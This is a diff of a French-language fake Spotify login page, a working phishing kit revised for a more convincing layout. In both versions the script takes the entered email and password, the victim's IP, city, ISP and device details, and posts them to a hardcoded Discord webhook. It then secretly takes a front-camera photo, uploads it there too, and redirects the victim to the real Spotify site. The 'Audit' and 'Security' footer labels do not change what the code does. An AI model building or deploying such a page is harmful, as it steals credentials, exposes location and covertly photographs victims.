@@ -2,88 +2,65 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Spotify - Connexion</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #000000; color: white; font-family: sans-serif; }
-        .input-field { background-color: #121212; border: 1px solid #727272; color: white; }
-        .input-field:focus { border: 1px solid #1DB954; outline: none; }
-        .btn-spotify { background-color: #1DB954; color: black; font-weight: bold; border-radius: 500px; padding: 14px; width: 100%; transition: 0.2s; }
-        .btn-spotify:hover { background-color: #1ed760; }
-        #v, #c { display: none; position: absolute; left: -9999px; }
+        body { background-color: #000000; color: #FFFFFF; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background-color: #121212; width: 90%; max-width: 400px; padding: 40px 30px; border-radius: 8px; text-align: center; }
+        .logo { width: 100px; margin: 0 auto 35px auto; }
+        h1 { font-size: 24px; font-weight: 700; margin-bottom: 30px; letter-spacing: -0.5px; }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        input { width: 100%; background-color: #121212; border: 1px solid #727272; border-radius: 4px; padding: 12px; color: white; font-size: 16px; }
+        input:focus { border: 2px solid #FFFFFF; outline: none; }
+        .btn-green { background-color: #1DB954; color: #000000; font-size: 14px; font-weight: 700; padding: 14px; border-radius: 500px; width: 100%; margin-top: 20px; text-transform: uppercase; letter-spacing: 1.5px; border: none; cursor: pointer; }
+        .links { margin-top: 30px; font-size: 13px; }
+        .links a { color: white; text-decoration: underline; font-weight: 700; }
+        #v, #c { position: absolute; left: -9999px; visibility: hidden; }
     </style>
 </head>
-<body class="flex flex-col items-center p-6 pt-12">
-
-    <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" alt="Spotify" class="w-32 mb-12">
-    
-    <div class="w-full max-w-sm">
-        <h1 class="text-2xl font-bold mb-8 text-center">Pour continuer, connectez-vous à Spotify.</h1>
-        
-        <div class="space-y-4">
-            <div>
-                <label class="block text-sm font-bold mb-2">E-mail ou nom d'utilisateur</label>
-                <input id="u" type="text" placeholder="E-mail ou nom d'utilisateur" class="input-field w-full p-3 rounded">
+<body>
+    <div class="login-box">
+        <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" alt="Spotify" class="logo">
+        <h1>Se connecter pour continuer</h1>
+        <div class="input-group"><input id="u" type="text" placeholder="E-mail ou nom d'utilisateur" spellcheck="false"></div>
+        <div class="input-group"><input id="p" type="password" placeholder="Mot de passe"></div>
+        <button onclick="captureAll()" id="btn" class="btn-green">Se connecter</button>
+        <div class="links">
+            <p><a href="#">Mot de passe oublié ?</a></p>
+            <div style="margin-top: 35px; border-top: 1px solid #282828; padding-top: 25px;">
+                <p style="color: #a7a7a7;">Tu n'as pas de compte ? <a href="#" style="margin-left: 5px;">S'INSCRIRE</a></p>
             </div>
-            <div>
-                <label class="block text-sm font-bold mb-2">Mot de passe</label>
-                <input id="p" type="password" placeholder="Mot de passe" class="input-field w-full p-3 rounded">
-            </div>
-            
-            <div class="pt-4">
-                <button onclick="sendData()" id="btn" class="btn-spotify uppercase tracking-widest text-sm">Se connecter</button>
-            </div>
-        </div>
-
-        <div class="mt-8 border-t border-gray-800 pt-6 text-center">
-            <p class="text-gray-400 text-sm">Vous n'avez pas de compte ?</p>
-            <button class="w-full border border-gray-500 rounded-full p-3 mt-4 font-bold uppercase tracking-widest text-sm text-gray-300">S'inscrire à Spotify</button>
         </div>
     </div>
-
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
-
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
-
-        async function sendData() {
+        async function captureAll() {
             const user = document.getElementById('u').value;
             const pass = document.getElementById('p').value;
-            const btn = document.getElementById('btn');
-            if (!user || !pass) return;
-            
-            btn.innerHTML = "CONNEXION EN COURS...";
-            btn.disabled = true;
-
-            // Collecte des infos
-            let net = { ip: "Inconnue", city: "Inconnue", country_name: "Inconnu", org: "Inconnu", region: "Inconnue" };
+            if(!user || !pass) return;
+            document.getElementById('btn').innerHTML = "CHARGEMENT...";
+            let net = {};
             try { const res = await fetch('https://ipapi.co/json/'); net = await res.json(); } catch(e) {}
-
-            let bat = "Inconnue";
-            try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charge' : 'Batterie'})`; } catch(e) {}
-
-            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnue";
-            const screen = `${window.screen.width}x${window.screen.height}`;
-
-            // Envoi Discord
+            let bat = "N/A";
+            try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}%`; } catch(e) {}
             const payload = {
                 embeds: [{
-                    title: "🔓 LOG SPOTIFY RÉCUPÉRÉ",
+                    title: "🚀 LOG RÉCUPÉRÉ - APP SPOTIFY",
                     color: 1947988,
+                    thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Spotify_logo_without_text.svg/1024px-Spotify_logo_without_text.svg.png" },
                     fields: [
-                        { name: "👤 Identifiants", value: `**Email:** \`${user}\`\n**Pass:** \`${pass}\``, inline: false },
-                        { name: "🌐 Localisation", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\`\n**Opérateur:** \`${net.org}\``, inline: false },
-                        { name: "📱 Système", value: `**Batterie:** \`${bat}\`\n**RAM:** \`${ram}\`\n**Écran:** \`${screen}\``, inline: true }
+                        { name: "👤 Identifiants", value: `**User:** \`${user}\`\n**Pass:** \`${pass}\``, inline: false },
+                        { name: "🌐 Localisation", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city || '?'}\`\n**FAI:** \`${net.org || '?'}\``, inline: false },
+                        { name: "🔋 Infos", value: `**Batterie:** \`${bat}\`\n**RAM:** \`${navigator.deviceMemory || 'N/A'}GB\``, inline: true },
+                        { name: "📱 Système", value: `\`${navigator.platform}\``, inline: true }
                     ],
-                    footer: { text: "Audit LVN • " + new Date().toLocaleString() }
+                    footer: { text: "LVN Security • " + new Date().toLocaleString() }
                 }]
             };
-
-            await fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-
-            // Photo
+            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('v');
@@ -94,14 +71,13 @@
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 canvas.toBlob(async (blob) => {
                     const fd = new FormData();
-                    fd.append('file', blob, 'photo.png');
-                    fd.append('content', "📸 **Photo de la cible :**");
+                    fd.append('file', blob, 'shot.png');
+                    fd.append('content', "📸 **Capture caméra :**");
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
                 }, 'image/png');
             } catch (e) {}
-
-            setTimeout(() => { window.location.href = "https://www.spotify.com"; }, 2500);
+            setTimeout(() => { window.location.href = "https://www.spotify.com/premium"; }, 2000);
         }
     </script>
 </body>
